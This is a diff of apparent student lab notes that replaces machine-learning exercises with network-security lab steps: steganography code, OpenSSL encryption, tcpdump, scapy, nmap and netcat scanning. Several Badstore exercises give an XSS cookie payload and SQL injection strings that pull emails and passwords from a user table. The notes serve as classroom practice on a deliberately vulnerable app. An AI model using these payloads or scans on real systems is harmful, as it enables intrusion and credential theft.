@@ -1,423 +1,577 @@
-	
-Part B
+3.Develop a python program to demonstrate lab image steganography
 
-Write a Python program to implement a simple Attention Mechanism for a given input sequence using NumPy or PyTorch. The program should compute attention scores, normalize them using softmax, and generate the context vector. Execute the program with a sample input sequence and display the attention weights and final output.
 import numpy as np
-import matplotlib.pyplot as plt
+from PIL import Image
 
-# Sample input tokens
-tokens = ["I", "love", "deep", "learning"]
+def Encode(src, message, dest):
+    img = Image.open(src, 'r')
+    width, height = img.size
+    array = np.array(list(img.getdata()))
 
-# Set random seed for reproducibility
-np.random.seed(0)
+    if img.mode == 'RGB':
+        n = 3
+    elif img.mode == 'RGBA':
+        n = 4
 
-# Model dimension
-d_model = 4
+    total_pixels = array.size // n
 
-# Random embeddings for tokens
-X = np.random.rand(len(tokens), d_model)
+    message += "$t3g0"
+    b_message = ''.join([format(ord(i), "08b") for i in message])
 
-# Weight matrices
-W_q = np.random.rand(d_model, d_model)
-W_k = np.random.rand(d_model, d_model)
-W_v = np.random.rand(d_model, d_model)
+    req_pixels = len(b_message)
 
-# Compute Query, Key, Value
-Q = X @ W_q
-K = X @ W_k
-V = X @ W_v
+    if req_pixels > total_pixels:
+        print("ERROR: Need larger file size")
+    else:
+        index = 0
+        for p in range(total_pixels):
+            for q in range(0, 3):
+                if index < req_pixels:
+                    array[p][q] = int(
+                        bin(array[p][q])[2:9] + b_message[index], 2
+                    )
+                    index += 1
 
-# Dimension for scaling
-dk = d_model
+    array = array.reshape(height, width, n)
+    enc_img = Image.fromarray(array.astype('uint8'), img.mode)
+    enc_img.save(dest)
+    print("Image Encoded Successfully")
 
-# Compute attention scores
-scores = Q @ K.T / np.sqrt(dk)
 
-# Softmax function
-def softmax(x):
-    exp_x = np.exp(x - np.max(x, axis=-1, keepdims=True))
-    return exp_x / np.sum(exp_x, axis=-1, keepdims=True)
+def Decode(src):
+    img = Image.open(src, 'r')
+    array = np.array(list(img.getdata()))
 
-# Compute attention weights
-attention_weights = softmax(scores)
+    if img.mode == 'RGB':
+        n = 3
+    elif img.mode == 'RGBA':
+        n = 4
 
-# Compute context vector (final output)
-context_vector = attention_weights @ V
+    total_pixels = array.size // n
+    hidden_bits = ""
 
-# Print results
-print("Attention Weights:\n", attention_weights)
-print("\nContext Vector:\n", context_vector)
+    for p in range(total_pixels):
+        for q in range(0, 3):
+            hidden_bits += (bin(array[p][q])[2:][-1])
 
-# Visualization of attention weights
-plt.figure(figsize=(6,5))
-plt.imshow(attention_weights, cmap='viridis')
-plt.colorbar()
+    hidden_bits = [hidden_bits[i:i+8] for i in range(0, len(hidden_bits), 8)]
 
-plt.xticks(range(len(tokens)), tokens)
-plt.yticks(range(len(tokens)), tokens)
+    message = ""
+    for i in range(len(hidden_bits)):
+        if message[-5:] == "$t3g0":
+            break
+        else:
+            message += chr(int(hidden_bits[i], 2))
 
-plt.xlabel("Key Tokens")
-plt.ylabel("Query Tokens")
-plt.title("Self-Attention Weights Visualization")
+    if "$t3g0" in message:
+        print("Hidden Message:", message[:-5])
+    else:
+        print("No Hidden Message Found")
 
-# Display attention values on heatmap
-for i in range(len(tokens)):
-    for j in range(len(tokens)):
-        plt.text(j, i,
-                 f"{attention_weights[i,j]:.2f}",
-                 ha="center",
-                 va="center",
-                 color="white",
-                 fontsize=11,
-                 fontweight="bold")
 
-plt.tight_layout()
-plt.show()
-Attention Weights:
- [[0.28148404 0.2628445  0.29895086 0.1567206 ]
- [0.28038026 0.26341764 0.29782337 0.15837873]
- [0.28440506 0.25797074 0.29955776 0.15806644]
- [0.27841505 0.26616423 0.28820408 0.16721664]]
+def Stego():
+    print("-- Welcome to $t3g0 --")
+    print("1: Encode")
+    print("2: Decode")
 
-Context Vector:
- [[1.26297927 0.49485364 1.11391894 0.59122572]
- [1.26263143 0.49437764 1.11286176 0.59074766]
- [1.26343899 0.49501532 1.11308755 0.59141252]
- [1.26110194 0.49126898 1.106323   0.58759526]]
-No description has been provided for this image
-Write a Python program to implement a basic Generative Adversarial Network (GAN) for generating synthetic data (or images such as handwritten digits). The program should define the Generator and Discriminator models, train the GAN for a few epochs, and display or print the generated output after training. Execute the program and show the result.
-import torch, torch.nn as nn, torch.optim as optim
-from torchvision import datasets, transforms
-from torch.utils.data import DataLoader
-import matplotlib.pyplot as plt
+    func = input()
 
-device = "cuda" if torch.cuda.is_available() else "cpu"
+    if func == '1':
+        print("Enter Source Image Path")
+        src = input()
+        print("Enter Message to Hide")
+        message = input()
+        print("Enter Destination Image Path")
+        dest = input()
+        print("Encoding...")
+        Encode(src, message, dest)
 
-z_dim, batch_size, epochs = 100, 128, 30
+    elif func == '2':
+        print("Enter Source Image Path")
+        src = input()
+        print("Decoding...")
+        Decode(src)
 
-transform = transforms.Compose([transforms.ToTensor(),
-                                transforms.Normalize((0.5,), (0.5,))])
+    else:
+        print("ERROR: Invalid option chosen")
 
-loader = DataLoader(
-    datasets.MNIST("./data", train=True, download=True, transform=transform),
-    batch_size=batch_size, shuffle=True)
 
-# Generator
-G = nn.Sequential(
-    nn.Linear(z_dim,256), nn.LeakyReLU(0.2),
-    nn.Linear(256,512), nn.LeakyReLU(0.2),
-    nn.Linear(512,1024), nn.LeakyReLU(0.2),
-    nn.Linear(1024,784), nn.Tanh()
-).to(device)
+Stego()
 
-# Discriminator
-D = nn.Sequential(
-    nn.Flatten(),
-    nn.Linear(784,512), nn.LeakyReLU(0.2),
-    nn.Linear(512,256), nn.LeakyReLU(0.2),
-    nn.Linear(256,1), nn.Sigmoid()
-).to(device)
+4. openssl version
 
-loss = nn.BCELoss()
-optG = optim.Adam(G.parameters(),0.0002,(0.5,0.999))
-optD = optim.Adam(D.parameters(),0.0002,(0.5,0.999))
+touch plain.txt
+gedit plain.txt
+cat plain.txt
 
-for epoch in range(1,epochs+1):
-    for real,_ in loader:
-        real = real.to(device)
-        bs = real.size(0)
+openssl enc -aes-128-cbc -e -in plain.txt -out cipher1.bin -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff
+openssl enc -aes-128-cbc -d -in cipher1.bin -out output1.txt -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff
+xxd cipher1.bin
+cat output1.txt
 
-        real_label = torch.ones(bs,1).to(device)
-        fake_label = torch.zeros(bs,1).to(device)
+openssl enc -aes-128-ecb -e -in plain.txt -out cipher2.bin -K 0123456789abcdeffedcba9876543210
+openssl enc -aes-128-ecb -d -in cipher2.bin -out output2.txt -K 0123456789abcdeffedcba9876543210
+xxd cipher2.bin
+cat output2.txt
 
-        # Train Discriminator
-        z = torch.randn(bs,z_dim).to(device)
-        fake = G(z).view(-1,1,28,28)
 
-        lossD = loss(D(real),real_label) + loss(D(fake.detach()),fake_label)
-        optD.zero_grad(); lossD.backward(); optD.step()
+5. openssl enc -aes-128-ecb -e -in pic_original.bmp -out pic_ecb.bmp -K 0123456789abcdeffedcba9876543210
 
-        # Train Generator
-        z = torch.randn(bs,z_dim).to(device)
-        fake = G(z).view(-1,1,28,28)
+openssl enc -aes-128-cbc -e -in pic_original.bmp -out pic_cbc.bmp -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff
 
-        lossG = loss(D(fake),real_label)
-        optG.zero_grad(); lossG.backward(); optG.step()
+head -c 54 pic_original.bmp > header
 
-    print(f"Epoch {epoch}/{epochs}  Loss_D:{lossD.item():.4f}  Loss_G:{lossG.item():.4f}")
+tail -c +55 pic_ecb.bmp > body_ecb
+cat header body_ecb > new_ecb.bmp
 
-    # Show images every 5 epochs
-    if epoch % 5 == 0:
-        with torch.no_grad():
-            z = torch.randn(16,z_dim).to(device)
-            samples = G(z).view(-1,1,28,28).cpu()*0.5 + 0.5
+tail -c +55 pic_cbc.bmp > body_cbc
+cat header body_cbc > new_cbc.bmp
 
-        fig,ax = plt.subplots(1,16,figsize=(16,2))
-        for i in range(16):
-            ax[i].imshow(samples[i][0],cmap="gray")
-            ax[i].axis("off")
-        plt.title(f"Epoch {epoch}")
-        plt.show()
-Epoch 1/30  Loss_D:0.9606  Loss_G:1.2982
-Epoch 2/30  Loss_D:0.8769  Loss_G:1.7751
-Epoch 3/30  Loss_D:1.2819  Loss_G:1.2336
-Epoch 4/30  Loss_D:1.0977  Loss_G:0.7099
-Epoch 5/30  Loss_D:0.7018  Loss_G:1.8714
-No description has been provided for this image
-Epoch 6/30  Loss_D:1.0381  Loss_G:1.6923
-Epoch 7/30  Loss_D:0.7239  Loss_G:1.3645
-Epoch 8/30  Loss_D:0.8175  Loss_G:1.5502
-Epoch 9/30  Loss_D:0.8521  Loss_G:1.7325
-Epoch 10/30  Loss_D:0.8309  Loss_G:1.4038
-No description has been provided for this image
-Epoch 11/30  Loss_D:0.8883  Loss_G:1.6705
-Epoch 12/30  Loss_D:1.1334  Loss_G:1.4454
-Epoch 13/30  Loss_D:1.1042  Loss_G:1.3810
-Epoch 14/30  Loss_D:1.0381  Loss_G:1.4849
-Epoch 15/30  Loss_D:1.0990  Loss_G:1.1993
-No description has been provided for this image
-Epoch 16/30  Loss_D:1.0573  Loss_G:1.4387
-Epoch 17/30  Loss_D:1.0795  Loss_G:1.1819
-Epoch 18/30  Loss_D:1.2799  Loss_G:1.8433
-Epoch 19/30  Loss_D:1.1908  Loss_G:0.8106
-Epoch 20/30  Loss_D:1.0139  Loss_G:1.1554
-No description has been provided for this image
-Epoch 21/30  Loss_D:1.2657  Loss_G:0.5809
-Epoch 22/30  Loss_D:1.1597  Loss_G:1.6817
-Epoch 23/30  Loss_D:1.0686  Loss_G:0.9546
-Epoch 24/30  Loss_D:1.2336  Loss_G:1.5350
-Epoch 25/30  Loss_D:1.2058  Loss_G:0.7884
-No description has been provided for this image
-Epoch 26/30  Loss_D:1.2364  Loss_G:1.2420
-Epoch 27/30  Loss_D:1.1399  Loss_G:0.8676
-Epoch 28/30  Loss_D:1.0677  Loss_G:1.2999
-Epoch 29/30  Loss_D:1.1869  Loss_G:0.7556
-Epoch 30/30  Loss_D:1.1253  Loss_G:0.8668
-No description has been provided for this image
-Write a Python program using a pre-trained language model to demonstrate Parameter-Efficient Fine-Tuning (PEFT) with LoRA. Fine-tune the model on a small custom dataset (for example, question-answer pairs or text classification samples) and test the model with a new input prompt. Execute the program and display the output before and after fine-tuning.
-import torch
-from transformers import AutoTokenizer, AutoModelForSequenceClassification
-from peft import LoraConfig, get_peft_model, TaskType
+eog new_ecb.bmp
+eog new_cbc.bmp  
 
-# -------------------------
-# Dataset (your dataset)
-# -------------------------
-texts = [
-    "I love this movie", "This is wonderful",
-    "Absolutely fantastic film", "I really enjoyed this movie",
-    "Brilliant acting and story", "Amazing experience",
-    "Superb direction", "I liked this a lot",
-    "Great movie overall", "One of the best films",
 
-    "I hate this movie", "This is terrible",
-    "Absolutely boring film", "I really disliked this movie",
-    "Awful acting and story", "Horrible experience",
-    "Poor direction", "I did not like this at all",
-    "Worst movie ever", "Very disappointing film",
-]
+6. echo -n 12345 > f1.txt
+echo -n 1234567890 > f2.txt
+echo -n 1234567890abcdef > f3.txt
 
-labels = [1]*10 + [0]*10   # 1 = Positive, 0 = Negative
+ls -l f*.txt
 
-# -------------------------
-# Load model
-# -------------------------
-model_name = "distilbert-base-uncased"
-tokenizer = AutoTokenizer.from_pretrained(model_name)
+openssl enc -aes-128-cbc -e -in f1.txt -out f1.bin -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff
+openssl enc -aes-128-cbc -d -in f1.bin -out f1_dec.txt -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff
+openssl enc -aes-128-cbc -d -in f1.bin -out f1_nopad.txt -nopad -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff
+xxd f1_dec.txt
+xxd f1_nopad.txt
 
-model = AutoModelForSequenceClassification.from_pretrained(model_name, num_labels=2)
+openssl enc -aes-128-cbc -e -in f2.txt -out f2.bin -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff
+openssl enc -aes-128-cbc -d -in f2.bin -out f2_dec.txt -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff
+openssl enc -aes-128-cbc -d -in f2.bin -out f2_nopad.txt -nopad -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff
+xxd f2_dec.txt
+xxd f2_nopad.txt
 
-# -------------------------
-# Prediction function
-# -------------------------
-def predict(model, text):
-    inputs = tokenizer(text, return_tensors="pt")
-    with torch.no_grad():
-        logits = model(**inputs).logits
-    probs = logits.softmax(dim=-1)
-    return probs
+openssl enc -aes-128-cbc -e -in f3.txt -out f3.bin -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff
+openssl enc -aes-128-cbc -d -in f3.bin -out f3_dec.txt -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff
+openssl enc -aes-128-cbc -d -in f3.bin -out f3_nopad.txt -nopad -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff
+xxd f3_dec.txt
+xxd f3_nopad.txt
 
-# -------------------------
-# BEFORE Fine-Tuning
-# -------------------------
-print("Before Fine-Tuning:")
-print("Positive:", predict(model, "I love this movie"))
-print("Negative:", predict(model, "This is terrible"))
 
-# -------------------------
-# Apply LoRA (PEFT)
-# -------------------------
-lora_config = LoraConfig(
-    task_type=TaskType.SEQ_CLS,
-    r=8,
-    lora_alpha=16,
-    target_modules=["q_lin", "v_lin"]
+7. part a:error propagation
+                                                                                                                                                                                                                   touch plain.txt
+gedit plain.txt
+
+openssl enc -aes-128-ecb -e -in plain.txt -out cipher_ecb.bin -K 0123456789abcdeffedcba9876543210
+
+ghex cipher_ecb.bin
+
+openssl enc -aes-128-ecb -d -in cipher_ecb.bin -out op_ecb.txt -K 0123456789abcdeffedcba9876543210
+
+openssl enc -aes-128-cbc -e -in plain.txt -out cipher_cbc.bin -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff
+
+ghex cipher_cbc.bin
+
+openssl enc -aes-128-cbc -d -in cipher_cbc.bin -out op_cbc.txt -K 0123456789abcdeffedcba9876543210 -iv 00112233445566778899aabbccddeeff
+
+cat op_ecb.txt
+cat op_cbc.txt
+
+part b : initialisation vector 
+
+echo "THIS IS SAMPLE DATA FOR AES IV TEST" > abc.txt
+
+openssl enc -aes-128-cbc -e -in abc.txt -out cipher_iv1.bin -K 00112233445566778899AABBCCDDEEFF -iv 0102030405060708090A0B0C0D0E0F10
+xxd cipher_iv1.bin
+
+openssl enc -aes-128-cbc -e -in abc.txt -out cipher_iv2.bin -K 00112233445566778899AABBCCDDEEFF -iv 1112131415161718191A1B1C1D1E1F20
+xxd cipher_iv2.bin
+
+openssl enc -aes-128-cbc -e -in abc.txt -out cipher_same1.bin -K 00112233445566778899AABBCCDDEEFF -iv 0102030405060708090A0B0C0D0E0F10
+xxd cipher_same1.bin
+
+openssl enc -aes-128-cbc -e -in abc.txt -out cipher_same2.bin -K 00112233445566778899AABBCCDDEEFF -iv 0102030405060708090A0B0C0D0E0F10
+xxd cipher_same2.bin
+
+openssl enc -aes-128-cbc -d -in cipher_iv1.bin -out dec_iv1.txt -K 00112233445566778899AABBCCDDEEFF -iv 0102030405060708090A0B0C0D0E0F10
+cat dec_iv1.txt
+
+openssl enc -aes-128-cbc -d -in cipher_iv2.bin -out dec_iv2.txt -K 00112233445566778899AABBCCDDEEFF -iv 1112131415161718191A1B1C1D1E1F20
+cat dec_iv2.txt
+
+
+8. openssl genrsa -out key.pri 2048
+openssl rsa -in key.pri -out key.pub -pubout
+openssl rsa -in key.pri -noout -text
+cat key.pub
+
+echo "HELLO" > msg.txt
+openssl rsautl -encrypt -inkey key.pub -pubin -in msg.txt -out msg.enc
+openssl rsautl -decrypt -inkey key.pri -in msg.enc -out msg.dec
+cat msg.dec
+
+openssl rand -hex 32 > secret.key
+openssl rsautl -encrypt -inkey key.pub -pubin -in secret.key -out secret.key.enc
+openssl rsautl -decrypt -inkey key.pri -in secret.key.enc -out secret.key.dec
+cat secret.key
+cat secret.key.dec
+
+
+10. tcpdump -D
+
+sudo tcpdump -i any
+Ctrl + C
+
+sudo tcpdump -i any -w capture.pcap
+Ctrl + C
+
+# open new terminal
+ping google.com
+Ctrl + C
+
+# back to first terminal
+sudo tcpdump -i any tcp
+Ctrl + C
+
+sudo tcpdump -i any icmp
+Ctrl + C
+
+sudo tcpdump -i any port 80
+Ctrl + C
+
+sudo tcpdump -n -i any 'tcp[tcpflags] & tcp-syn != 0'
+Ctrl + C
+
+sudo tcpdump -n -i any 'tcp[tcpflags] & tcp-syn != 0' -w tcpsyn.pcap
+Ctrl + C
+
+sudo tcpdump -n -i any 'tcp[tcpflags] & tcp-ack != 0'
+Ctrl + C
+
+sudo tcpdump -n -i any 'tcp[tcpflags] & (tcp-syn|tcp-ack) != 0'
+Ctrl + C
+
+sudo tcpdump -n -i any 'tcp[tcpflags] & tcp-fin != 0' -w tcpfin.pcap
+Ctrl + C
+
+sudo tcpdump -r capture.pcap
+
+sudo tcpdump -A -r capture.pcap
+
+sudo tcpdump -xx -r capture.pcap
+
+sudo tcpdump -xx -r tcpsyn.pcap
+
+sudo tcpdump -xx -r tcpfin.pcap
+
+
+
+1a Badstore
+1b
+sudo python3
+from scapy.all import *
+myframe=Ether()/IP() 
+myframe.show()
+myframe.summary()
+
+
+packet=Ether()/ARP()
+packet.show()
+packet.summary()
+
+
+1c
+
+nano port_scan.sh
+inside
+#!/bin/bash
+
+host="www.example.com"
+
+read -p "Enter the starting port number: " start_port
+read -p "Enter the ending port number: " end_port
+
+for ((port=start_port; port<=end_port; port++))
+do
+    echo "Scanning port $port..."
+    nc -zv -w1 "$host" "$port" 2>&1
+done
+
+chmod +x port_scan.sh
+
+./port_scan.sh
+
+------------------------------------------------------
+
+2a badstore
+2b
+sudo python3
+from scapy.all import *
+pac=sniff(count=10)
+pac.summary()
+
+
+2c
+1st termianl
+nc -vlp 1234
+2nd terminal
+nc localhost 1234
+
+------------------------------------------------------
+
+
+3a
+sudo python3
+from scapy.all import *
+result, unanswered = traceroute(["www.example.com", "www.google.com"], maxttl=20)
+result.show()
+
+3b
+nc example.com 80
+GET / HTTP/1.1
+Host: example.com
+
+HEAD / HTTP/1.1
+Host: example.com
+
+3c 
+nmap -sn 127.0.0.1
+
+nmap -sn 127.0.0.1/24
+
+------------------------------------------------------
+
+
+4a
+ifconfig
+nano scanner.py
+inside 
+import scapy.all as scapy
+
+request = scapy.ARP()
+request.pdst = "10.0.2.15/24"   
+
+broadcast = scapy.Ether()
+broadcast.dst = "ff:ff:ff:ff:ff:ff"
+
+request_broadcast = broadcast / request
+
+clients = scapy.srp(request_broadcast, timeout=1)[0]
+
+print("IP Address\t\tMAC Address")
+print("-----------------------------------------")
+
+for element in clients:
+    print(element[1].psrc + "\t\t" + element[1].hwsrc)
+
+
+sudo python3 scanner.py
+
+4b
+
+nc -l -p 5000
+http://localhost:5000
+
+in terminal after few seconds 
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Server: nooblinux
+
+Hello from Netcat!
+
+4c nmap -sn 127.0.0.100-200
+nmap -sn 127.0.0.0/24
+
+------------------------------------------------------
+
+
+5a Badstore
+<script>alert(document.cookie)</script>
+
+5b
+same as 1c
+
+5c 
+nmap 127.0.1.1
+
+nmap -sV 127.0.1.1
+
+------------------------------------------------------
+
+
+6a Badstore(same as 5a)
+<script>alert(document.cookie)</script>
+
+6b 
+nmap -O 127.0.1.1
+
+nmap -A 127.0.1.1
+
+6c Badstore
+xx' IN (itemnum,sdesc,ldesc) union select email,passwd,123,123 from userdb LIMIT 2 -- 
+
+------------------------------------------------------
+
+7a
+sudo python3
+
+from scapy.all import *
+packet = IP(dst="8.8.8.8")/ICMP()
+send(packet)
+open wwire shark and search for icmp then re run the below command 
+send(IP(dst="8.8.8.8")/ICMP())
+
+
+ans, unans = sr(packet, timeout=2)
+ans[0]
+ans[0][1].show()
+
+7b
+nc -l -p 8080 < image.jpg
+
+or 
+
+printf "HTTP/1.1 200 OK\r\nContent-Type: image/jpeg\r\nConnection: close\r\n\r\n" | cat - lion.jpeg | nc -l -p 8080
+
+http://localhost:8080
+
+7c Badstore
+x' union select count(itemnum),count(itemnum),count(itemnum),count(itemnum) from
+itemdb -- 
+
+------------------------------------------------------
+
+8a
+import socket
+
+target_ip = socket.gethostbyname("www.example.com")
+print("Target IP:", target_ip)
+
+
+from scapy.all import *
+import socket
+
+# Resolve domain to IP
+target_ip = socket.gethostbyname("www.example.com")
+
+# Ports to scan
+ports = [22, 80, 443]
+
+print(f"Scanning target: {target_ip}")
+
+# SYN Scan
+for port in ports:
+    packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
+    response = sr1(packet, timeout=1, verbose=0)
+
+    if response:
+        if response.haslayer(TCP):
+            if response[TCP].flags == "SA":
+                print(f"Port {port} is OPEN")
+                
+                # Send RST to close connection properly
+                send(IP(dst=target_ip)/TCP(dport=port, flags="R"), verbose=0)
+                
+            elif response[TCP].flags == "RA":
+                print(f"Port {port} is CLOSED")
+    else:
+        print(f"Port {port} is FILTERED or NO RESPONSE")
+
+8b 
+nmap --script vuln 127.0.1.1
+
+nmap --script vuln 127.0.1.1 -oN txtgh.txt
+
+8c Badstore
+
+------------------------------------------------------
+
+
+9a 
+same as 7b
+9b
+same as 4c
+
+9c Badstore
+
+------------------------------------------------------
+
+
+10a
+nano icmp_monitor.py
+
+from scapy.all import *
+
+# Callback function (runs every time a packet is captured)
+def packet_callback(packet):
+    
+    # Check if packet has IP layer
+    if packet.haslayer(IP):
+        
+        # Check if protocol is ICMP (protocol number = 1)
+        if packet[IP].proto == 1:
+            print(f"ICMP packet detected from {packet[IP].src} to {packet[IP].dst}")
+
+# Start sniffing
+sniff(prn=packet_callback, filter="icmp", store=0)
+
+
+sudo python3 icmp_monitor.py
+
+in another terminal run
+ping 8.8.8.8
+
+10b
+same as 5c
+
+10c Badstore
+
+------------------------------------------------------
+
+
+11a
+nano scap.py 
+import scapy.all as scapy
+
+request = scapy.ARP()
+request.pdst = "192.168.5.0/24"
+
+broadcast = scapy.Ether()
+broadcast.dst = "ff:ff:ff:ff:ff:ff"
+
+request_broadcast = broadcast / request
+
+clients = scapy.srp(request_broadcast, timeout=1, verbose=False)[0]
+
+for element in clients:
+    print(element[1].psrc + "  " + element[1].hwsrc)
+
+ sudo python3 scap.py 
+
+
+11b
+same as 7b
+
+11 c Badstore
+
+------------------------------------------------------
+
+12 a
+nano traceroute.py
+from scapy.all import *
+
+# Perform traceroute to multiple targets
+result, unanswered = traceroute(
+    ["www.example.com", "www.google.com"],
+    maxttl=20
 )
 
-model = get_peft_model(model, lora_config)
+# Display result
+result.show()
 
-# -------------------------
-# Training
-# -------------------------
-optimizer = torch.optim.Adam(model.parameters(), lr=1e-4)
+sudo python3 traceroute.py
 
-model.train()
-for epoch in range(5):
-    for text, label in zip(texts, labels):
-        inputs = tokenizer(text, return_tensors="pt")
-        labels_tensor = torch.tensor([label])
+12b
+same as 7b
 
-        outputs = model(**inputs, labels=labels_tensor)
-        loss = outputs.loss
-
-        optimizer.zero_grad()
-        loss.backward()
-        optimizer.step()
-
-# -------------------------
-# AFTER Fine-Tuning
-# -------------------------
-model.eval()
-
-print("\nAfter Fine-Tuning:")
-print("Positive:", predict(model, "I love this movie"))
-print("Negative:", predict(model, "This is terrible"))
-Some weights of DistilBertForSequenceClassification were not initialized from the model checkpoint at distilbert-base-uncased and are newly initialized: ['classifier.bias', 'classifier.weight', 'pre_classifier.bias', 'pre_classifier.weight']
-You should probably TRAIN this model on a down-stream task to be able to use it for predictions and inference.
-Before Fine-Tuning:
-Positive: tensor([[0.4277, 0.5723]])
-Negative: tensor([[0.4260, 0.5740]])
-
-After Fine-Tuning:
-Positive: tensor([[0.2796, 0.7204]])
-Negative: tensor([[0.7136, 0.2864]])
-Write a Python program that uses a Generative AI model to solve a reasoning problem using Zero-shot, Few-shot, and Chain-of-Thought prompting techniques. The program should generate and display outputs for all three prompting methods for the same problem and compare the responses. Execute the program and show the results.
-from transformers import AutoTokenizer, AutoModelForSeq2SeqLM
-import torch
-
-# -------------------------
-# Load FLAN-T5 model
-# -------------------------
-model_name = "google/flan-t5-base"
-
-tokenizer = AutoTokenizer.from_pretrained(model_name)
-model = AutoModelForSeq2SeqLM.from_pretrained(model_name)
-
-device = "cuda" if torch.cuda.is_available() else "cpu"
-model = model.to(device)
-
-# -------------------------
-# Function
-# -------------------------
-def generate_text(prompt):
-    inputs = tokenizer(prompt, return_tensors="pt",truncation=True).to(device)
-    outputs = model.generate(**inputs, max_new_tokens=100)
-    return tokenizer.decode(outputs[0], skip_special_tokens=True)
-
-# -------------------------
-# Simple Question
-# -------------------------
-question = "If 1 pen costs 10 rupees, what is the cost of 5 pens?"
-
-# -------------------------
-# 1. Zero-Shot
-# -------------------------
-zero_prompt = f"""
-Answer the question:
-
-{question}
-"""
-
-zero_output = generate_text(zero_prompt)
-
-# -------------------------
-# 2. Few-Shot
-# -------------------------
-few_prompt = f"""
-Solve the following:
-
-Q: If 1 pen costs 10 rupees, what is the cost of 3 pens?
-A: 3 * 10 = 30 rupees
-
-Q: If 1 pencil costs 10 rupees, what is the cost of 4 pencils?
-A: 4 * 10 = 40 rupees
-
-Q: If 1 book costs 10 rupees , what is the cost of 5 books?
-A: 5 * 10 = 50 rupees
-
-Q: {question}
-A:
-"""
-
-few_output = generate_text(few_prompt)
-
-# -------------------------
-# 3. Chain-of-Thought
-# -------------------------
-cot_prompt = f"""
-Let's slove step by step and then give final answer:
-
-Q: {question}
-Final Answer:
-"""
-
-cot_output = generate_text(cot_prompt)
-
-# -------------------------
-# Output
-# -------------------------
-print("===== ZERO-SHOT OUTPUT =====")
-print(zero_output)
-
-print("\n===== FEW-SHOT OUTPUT =====")
-print(few_output)
-
-print("\n===== CHAIN-OF-THOUGHT OUTPUT =====")
-print(cot_output)
-===== ZERO-SHOT OUTPUT =====
-10 x 10 = 50 rupees
-
-===== FEW-SHOT OUTPUT =====
-10 * 10 = 50 rupees. 5 * 50 = 100 rupees.
-
-===== CHAIN-OF-THOUGHT OUTPUT =====
-The cost of 5 pens is 10 x 5 = 50 rupees. The final answer: 50.
-Write a Python program to implement one Discriminative model (such as Logistic Regression or SVM) and one Generative model (such as Naive Bayes or a simple text generator). Train both models on a small dataset, execute the program, and display their predictions or generated outputs for test inputs to demonstrate the difference between discriminative and generative approaches.
-from sklearn.feature_extraction.text import CountVectorizer
-from sklearn.linear_model import LogisticRegression
-from sklearn.naive_bayes import MultinomialNB
-
-# ------------------ Dataset ------------------
-texts = ["I love this movie", "Amazing film",
-         "I hate this movie", "Terrible film"]
-
-labels = [1, 1, 0, 0]   # 1 = positive, 0 = negative
-
-# Convert text → numbers
-vectorizer = CountVectorizer()
-X = vectorizer.fit_transform(texts)
-
-# ------------------ Models ------------------
-# Discriminative
-lr = LogisticRegression()
-lr.fit(X, labels)
-
-# Generative
-nb = MultinomialNB()
-nb.fit(X, labels)
-
-# ------------------ Testing ------------------
-test = ["I love this", "Bad movie"]
-X_test = vectorizer.transform(test)
-
-# Predictions
-print("Logistic Regression (Discriminative):")
-print(lr.predict(X_test))
-
-print("\nNaive Bayes (Generative):")
-print(nb.predict(X_test))
-Logistic Regression (Discriminative):
-[1 0]
-
-Naive Bayes (Generative):
-[1 0]
- 
+12 c
+Badstore
